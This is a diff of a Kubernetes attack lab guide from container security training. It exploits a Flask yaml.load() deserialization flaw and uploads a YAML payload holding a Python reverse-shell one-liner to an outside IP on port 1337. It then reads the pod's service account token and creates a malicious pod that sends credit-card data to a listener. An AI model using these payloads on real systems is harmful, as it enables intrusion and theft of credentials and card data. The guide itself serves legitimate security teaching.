@@ -1,26 +1,29 @@
 # **Attacking a K8s Cluster**
 
-### * *
+---
 
--------
+### **Lab Image : Kubernetes**
+
+---
 
 #### Step 1:
 
 * Navigate to the `K8s-Cluster-Attack` directory on the provisioned server.
 
-```
+```commandline
 cd /root/container-training/Kubernetes/K8s-Cluster-Attack
 ```
 
 * Multiplex terminal session with `tmux` and split panes horizontally.
 
-```
+```commandline
 tmux
-
+```
+```commandline
 tmux split-window -v
 ```
 
--------
+---
 
 #### Step 2:
 
@@ -34,7 +37,8 @@ sed -i -e 's/abhaybhargav/we45/g' ngflaskredis-deployment.yml
 
 ```commandline
 ./setup_insecure_kube.sh
-
+```
+```commandline
 ./setup_flask_stack.sh
 ```
 
@@ -50,7 +54,7 @@ kubectl get pods
 kubectl get svc
 ```
 
--------
+---
 
 #### Step 3:
 
@@ -58,7 +62,8 @@ kubectl get svc
 
 ```commandline
 NGFLASK=http://$(kubectl get svc ngflask-redis-service -o yaml | grep "clusterIP" |awk '{print $2}')
-
+```
+```commandline
 echo $NGFLASK
 ```
 
@@ -68,7 +73,7 @@ echo $NGFLASK
 http GET $NGFLASK
 ```
 
--------
+---
 
 #### Step 4:
 
@@ -112,17 +117,17 @@ http GET $NGFLASK/status
 </html>
 ```
 
--------
+---
 
 #### Step 5:
 
-### *Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉*
+> #### Our objective is to compromise this cluster. Run our cryptominer and steal card numbers 😉
 
-### *Exploiting a Deserialization Flaw*
+> #### Exploiting a Deserialization Flaw
 
-#### *Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.*
+> #### Our Flask app has a `yaml.load()` deserialization flaw. Using this flaw, one can potentially gain access to execute code on the backend-server. We will be using this vulnerability to exploit our app.
 
-#### *Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.*
+> #### Our app allows us to upload yaml files to capture expense information. We will load a malicious yaml file that should execute code for us.
 
 * Navigate to `payloads` directory that has malicious yaml files
 
@@ -159,23 +164,15 @@ curl -XGET $NGFLASK/status
 
 ### *You should see a dump of all Environment variables on the container.*
 
--------
+---
 
 #### Step 6:
-
-* Fetch the IP of the provisioned server
-
-```commandline
-serverip
-```
 
 * In the `payloads` directory, edit `line 2` of `reverse_shell.yml` and replace `<serverip>` with value of `serverip` fetched in the previous step.
 
 ```commandline
-sed -i -e 's/Server_IP_Here/<serverip>/g' reverse_shell.yml
+sed -i -e 's/Server_IP_Here/'"$(serverip)"'/g' reverse_shell.yml
 ```
-
-**EXAMPLE**: `sed -i -e 's/Server_IP_Here/104.1.1.1/g' reverse_shell.yml`
 
 * Check the file to confirm the changes made
 
@@ -185,25 +182,21 @@ cat reverse_shell.yml
 
 **EXAMPLE**: `["echo 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((\"104.1.1.1\",1337));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([\"/bin/sh\",\"-i\"]);' > shell.py && python shell.py &"]`
 
--------
+---
 
 #### Step 7:
 
 * Switch to the lower panel and start the `netcat` listener on port `1337`
 
+> ###### Switch to the lower panel with `ctrl` + `b` and then `lower arrow key`
 ```commandline
-# Switches to the lower panel
-ctrl + b + (lower arrow key)
-
 nc -l 1337
 ```
 
 * Go to the upper pane and post the malicious `reverse_shell.yml` file
 
+> ###### Switch to the upper pane with `ctrl` + `b` and then `upper arrow key`
 ```commandline
-# Switches to the upper pane
-ctrl + b + (upper arrow key)
-
 http --form POST $NGFLASK/upload file@reverse_shell.yml
 ```
 
@@ -232,20 +225,19 @@ nc -l 1337
 
 ### *Now you can interact with your target app and backend K8s cluster*
 
-### **NOTE: Do NOT use the `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do `Step 6`**
+> **NOTE**:  Do NOT use the `Command/Ctrl+C` key. You will lose access to the shell and will have to re-do `Step 6`
 
--------
+---
 
 #### Step 8:
 
 * In the reverse shell, navigate within the pod to fetch `Service Account` token.
 
+> ###### Switch to the lower panel with `ctrl` + `b` and then `lower arrow key`
 ```commandline
-# Switches to the lower panel
-ctrl + b + (lower arrow key)
-
 cd /run/secrets/kubernetes.io/serviceaccount
-
+```
+```commandline
 export TOKEN=$(cat token)
 ```
 
@@ -278,7 +270,7 @@ curl -s https://10.96.0.1/api/v1/namespaces/default/services -XGET -H "Authoriza
     
     * Change `SERVERIP-HERE` with that of Server IP that can be fetched by running `serverip`
 
-```
+```commandline
 cat > mal-redis.json <<EOF
 {
     "kind": "Pod",
@@ -322,7 +314,7 @@ cd /tmp
 
 ### *root user of the pod will not have permission to create/edit files in `/run/secrets/kubernetes.io/serviceaccount`*
 
--------
+---
 
 #### Step 9:
 
@@ -330,8 +322,9 @@ cd /tmp
 
 **EXAMPLE**:
 
-```bash
-# Copy the JSON value you edited, please don't copy the one below
+> **NOTE**: Copy the JSON value you edited, don't copy the one below
+
+```commandline
 cat > mal-redis.json <<EOF
 {
     "kind": "Pod",
@@ -368,34 +361,37 @@ ls
 curl -s https://10.96.0.1/api/v1/namespaces/default/pods -XPOST -H "Authorization: Bearer $TOKEN" -H "Content-Type: application/json" -d@mal-redis.json --insecure
 ```
 
--------
+---
 
 #### Step 10:
 
 * Switch to the upper pane, navigate to the `K8s-Cluster-Attack` directory and setup the listener
 
+> ###### Switch to the upper pane with `ctrl` + `b` and then `upper arrow key`
+
 ```commandline
-ctrl + b + (upper arrow key)
-
 cd /root/container-training/Kubernetes/K8s-Cluster-Attack
-
+```
+```commandline
 python3 tornado_server.py
 ```
 
 ### *You should now see all the credit-card details being posted to the listener from the malicious redis pod*
 
--------
+---
 
 #### Step 11:
 
 * Stop the listener, pods and services that were created
 
+> ###### Stop the listener
 ```commandline
-# Stop the listener
 crtl + c
-
+```
+```commandline
 cd /root/container-training/Kubernetes/K8s-Cluster-Attack
-
+```
+```commandline
 kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis-deployment.yml
 ```
 
@@ -403,12 +399,14 @@ kubectl delete -f ngflask-redis-service.yml -f redis-service.yml -f ngflaskredis
 
 ```commandline
 kubectl get pods
-
+```
+```commandline
 kubectl delete pod mal-redis
-
+```
+```commandline
 kubectl delete configmap nginx-config
 ```
 
----------
+---
 
 ### Reading Material/References:
